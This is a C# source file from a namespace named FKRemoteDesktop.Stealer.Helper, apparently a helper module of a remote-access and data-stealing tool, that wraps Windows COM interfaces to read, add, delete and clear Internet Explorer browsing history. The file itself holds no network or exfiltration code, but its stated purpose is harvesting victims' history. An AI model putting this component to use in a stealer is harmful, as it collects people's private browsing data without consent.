using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer.Helper
{
    public class ExplorerUrlHistory : IDisposable
    {
        public enum STATURL_QUERYFLAGS : uint
        {
            STATURL_QUERYFLAG_ISCACHED = 0x00010000,
            STATURL_QUERYFLAG_NOURL = 0x00020000,
            STATURL_QUERYFLAG_NOTITLE = 0x00040000,
            STATURL_QUERYFLAG_TOPLEVEL = 0x00080000,
        }

        public enum ADDURL_FLAG : uint
        {
            ADDURL_ADDTOHISTORYANDCACHE = 0,
            ADDURL_ADDTOCACHE = 1
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UUID
        {
            public int Data1;
            public short Data2;
            public short Data3;
            public byte[] Data4;
        }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("3C374A42-BAE4-11CF-BF7D-00AA006946EE")]
        public interface IEnumSTATURL
        {
            void Next(int celt, ref SortFileTimeAscendingHelper.STATURL rgelt, out int pceltFetched); //Returns the next \"celt\" URLS from the cache

            void Skip(int celt); //Skips the next \"celt\" URLS from the cache. does not work.

            void Reset(); //Resets the enumeration

            void Clone(out IEnumSTATURL ppenum); //Clones this object

            void SetFilter([MarshalAs(UnmanagedType.LPWStr)] string poszFilter, SortFileTimeAscendingHelper.STATURLFLAGS dwFlags);

            //Sets the enumeration filter
        }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("3C374A41-BAE4-11CF-BF7D-00AA006946EE")]
        public interface IUrlHistoryStg
        {
            void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags); //Adds a new history entry

            void DeleteUrl(string pocsUrl, int dwFlags); //Deletes an entry by its URL. does not work!

            void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags,
              ref SortFileTimeAscendingHelper.STATURL lpSTATURL);

            void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut); //Binds to an object. does not work!

            object EnumUrls
            {
                [return: MarshalAs(UnmanagedType.IUnknown)]
                get;
            }
        }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("AFA0DC11-C313-11D0-831A-00C04FD5AE38")]
        public interface IUrlHistoryStg2 : IUrlHistoryStg
        {
            new void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags); //Adds a new history entry

            new void DeleteUrl(string pocsUrl, int dwFlags); //Deletes an entry by its URL. does not work!

            new void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags,
                ref SortFileTimeAscendingHelper.STATURL lpSTATURL);

            new void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut); //Binds to an object. does not work!

            new object EnumUrls
            {
                [return: MarshalAs(UnmanagedType.IUnknown)]
                get;
            }

            void AddUrlAndNotify(string pocsUrl, string pocsTitle, int dwFlags, int fWriteHistory, object poctNotify, object punkISFolder);

            void ClearHistory(); //Removes all history items
        }

        [ComImport]
        [Guid("3C374A40-BAE4-11CF-BF7D-00AA006946EE")]
        public class UrlHistoryClass
        {
        }

        private readonly IUrlHistoryStg2 obj;
        private UrlHistoryClass urlHistory;
        private List<SortFileTimeAscendingHelper.STATURL> _urlHistoryList;

        public ExplorerUrlHistory()
        {
            urlHistory = new UrlHistoryClass();
            obj = (IUrlHistoryStg2)urlHistory;
            STATURLEnumerator staturlEnumerator = new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);
            _urlHistoryList = new List<SortFileTimeAscendingHelper.STATURL>();
            staturlEnumerator.GetUrlHistory(_urlHistoryList);
        }

        public int Count
        {
            get
            {
                return _urlHistoryList.Count;
            }
        }

        public void Dispose()
        {
            Marshal.ReleaseComObject(obj);
            urlHistory = null;
        }

        public void AddHistoryEntry(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags)
        {
            obj.AddUrl(pocsUrl, pocsTitle, dwFlags);
        }

        public bool DeleteHistoryEntry(string pocsUrl, int dwFlags)
        {
            try
            {
                obj.DeleteUrl(pocsUrl, dwFlags);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public SortFileTimeAscendingHelper.STATURL QueryUrl(string pocsUrl, STATURL_QUERYFLAGS dwFlags)
        {
            var lpSTATURL = new SortFileTimeAscendingHelper.STATURL();
            try
            {
                obj.QueryUrl(pocsUrl, dwFlags, ref lpSTATURL);
                return lpSTATURL;
            }
            catch (FileNotFoundException)
            {
                return lpSTATURL;
            }
        }

        public void ClearHistory()
        {
            obj.ClearHistory();
        }

        public STATURLEnumerator GetEnumerator()
        {
            return new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);
        }

        public SortFileTimeAscendingHelper.STATURL this[int index]
        {
            get
            {
                if (index < _urlHistoryList.Count && index >= 0)
                    return _urlHistoryList[index];
                throw new IndexOutOfRangeException();
            }
            set
            {
                if (index < _urlHistoryList.Count && index >= 0)
                    _urlHistoryList[index] = value;
                else throw new IndexOutOfRangeException();
            }
        }

        public class STATURLEnumerator
        {
            private readonly IEnumSTATURL _enumerator;
            private int _index;
            private SortFileTimeAscendingHelper.STATURL _staturl;

            public STATURLEnumerator(IEnumSTATURL enumerator)
            {
                _enumerator = enumerator;
            }

            public SortFileTimeAscendingHelper.STATURL Current
            {
                get
                {
                    return _staturl;
                }
            }

            public bool MoveNext()
            {
                _staturl = new SortFileTimeAscendingHelper.STATURL();
                _enumerator.Next(1, ref _staturl, out _index);
                if (_index == 0)
                    return false;
                return true;
            }

            public void Skip(int celt)
            {
                _enumerator.Skip(celt);
            }

            public void Reset()
            {
                _enumerator.Reset();
            }

            public STATURLEnumerator Clone()
            {
                IEnumSTATURL ppenum;
                _enumerator.Clone(out ppenum);
                return new STATURLEnumerator(ppenum);
            }

            public void SetFilter(string poszFilter, SortFileTimeAscendingHelper.STATURLFLAGS dwFlags)
            {
                _enumerator.SetFilter(poszFilter, dwFlags);
            }

            public void GetUrlHistory(IList list)
            {
                while (true)
                {
                    _staturl = new SortFileTimeAscendingHelper.STATURL();
                    _enumerator.Next(1, ref _staturl, out _index);
                    if (_index == 0)
                        break;
                    list.Add(_staturl);
                }
                _enumerator.Reset();
            }
        }
    }
}